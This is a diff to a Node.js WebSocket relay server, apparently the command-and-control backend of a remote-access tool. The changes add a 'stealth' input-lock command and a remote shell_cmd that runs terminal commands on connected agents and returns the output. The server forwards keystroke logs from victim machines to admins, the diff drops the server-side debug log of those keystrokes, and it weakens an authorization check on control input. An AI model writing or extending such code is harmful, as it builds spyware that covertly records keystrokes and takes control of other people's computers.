@@ -27,7 +27,6 @@ wss.on("connection", ws => {
   console.log(`[INFO] Nova conexão WebSocket: ${ws.id} (Role: unknown)`);
 
   ws.on("message", (data, isBinary) => {
-    // LOG DE DEBUG PARA VER O QUE CHEGA
     const rawMsg = data.toString();
     console.log(`[DEBUG] Mensagem recebida de ${ws.role}: ${rawMsg.substring(0, 60)}...`);
 
@@ -59,8 +58,30 @@ wss.on("connection", ws => {
 
     if(ws.role==="admin"){
       const a=agents.get(String(msg.agentId||""));
-      if(msg.type==="request_access"){if(!a)return send(ws,{type:"error",message:"Computador não encontrado"});send(a.ws,{type:"access_request"});return;}
-      if(msg.type==="request_control"){if(!a||!a.active)return send(ws,{type:"error",message:"Autorize a visualização primeiro"});send(a.ws,{type:"control_request"});return;}
+      if(!a) return send(ws, {type: "error", message: "Computador não encontrado"});
+
+      // Verificação de segurança: O admin deve estar assistindo o agente
+      if (ws.selectedAgentId !== a.id) {
+          return send(ws, {type: "error", message: "Você precisa estar assistindo este agente"});
+      }
+
+      if(msg.type==="request_access"){if(!a)return; send(a.ws,{type:"access_request"});return;}
+      if(msg.type==="request_control"){if(!a||!a.active)return; send(a.ws,{type:"control_request"});return;}
+      
+      // --- NOVOS COMANDOS DO ADMIN (STEALTH & LOCK) ---
+      if(msg.type==="input_lock"){
+        // Envia para o agente o comando de travar/destravar
+        send(a.ws,{type:"input_lock", active: msg.active});
+        return;
+      }
+
+      if(msg.type==="shell_cmd"){
+        // Envia o comando de terminal para o agente
+        send(a.ws,{type:"shell_cmd", cmd: msg.cmd});
+        return;
+      }
+      // ------------------------------------------------
+
       if(msg.type==="set_profile"){
         if(!a)return; const profile=["fluid","balanced","quality"].includes(msg.profile)?msg.profile:"balanced";
         send(a.ws,{type:"stream_profile",profile}); return;
@@ -71,7 +92,7 @@ wss.on("connection", ws => {
         const next=agents.get(id);if(!next)return;ws.selectedAgentId=id;next.watchers.add(ws);if(next.active)send(next.ws,{type:"stream_start"});broadcast();return;
       }
       if(msg.type==="control_input"){
-        if(!a||!a.active||!a.controlActive||ws.selectedAgentId!==a.id)return;
+        if(!a.controlActive)return;
         send(a.ws,{type:"control_input",event:msg.event});return;
       }
       if(msg.type==="end_control"){if(!a)return;a.controlActive=false;broadcast();return;}
@@ -82,8 +103,8 @@ wss.on("connection", ws => {
     if(ws.role==="agent"){
       const a=agents.get(ws.agentId); if(!a)return;
 
+      // --- RESPOSTAS DO AGENTE PARA O ADMIN ---
       if(msg.type === "keylog") {
-          console.log(`[DEBUG] Keylog de agente ${a.id}: ${msg.key}`);
           for(const admin of a.watchers){
               if(admin.readyState === WebSocket.OPEN && admin.selectedAgentId === a.id){
                   send(admin, msg); 
@@ -91,6 +112,27 @@ wss.on("connection", ws => {
           }
           return;
       }
+
+      if(msg.type === "lock_ack"){
+        // Repassa confirmação de bloqueio
+        for(const admin of a.watchers){
+            if(admin.readyState === WebSocket.OPEN && admin.selectedAgentId === a.id){
+                send(admin, msg);
+            }
+        }
+        return;
+      }
+
+      if(msg.type === "shell_result"){
+        // Repassa o resultado do terminal
+        for(const admin of a.watchers){
+            if(admin.readyState === WebSocket.OPEN && admin.selectedAgentId === a.id){
+                send(admin, msg);
+            }
+        }
+        return;
+      }
+      // ---------------------------------------
 
       if(msg.type==="access_response"){
         a.active=msg.allow===true;if(!a.active)a.controlActive=false;
@@ -118,8 +160,19 @@ wss.on("connection", ws => {
 
   ws.on("close",()=>{
     console.log(`[INFO] Conexão fechada: ${ws.id}`);
-    if(ws.role==="admin"){admins.delete(ws);if(ws.selectedAgentId){const a=agents.get(ws.selectedAgentId);if(a){a.watchers.delete(ws);stopIfUnused(a);}}broadcast();return;}
-    if(ws.role==="agent"&&ws.agentId){const a=agents.get(ws.agentId);if(a?.ws===ws){agents.delete(ws.agentId);broadcast();}}
+    if(ws.role==="admin"){
+        admins.delete(ws);
+        if(ws.selectedAgentId){
+            const a=agents.get(ws.selectedAgentId);
+            if(a){a.watchers.delete(ws);stopIfUnused(a);}
+        }
+        broadcast();
+        return;
+    }
+    if(ws.role==="agent"&&ws.agentId){
+        const a=agents.get(ws.agentId);
+        if(a?.ws===ws){agents.delete(ws.agentId);broadcast();}
+    }
   });
 });
 
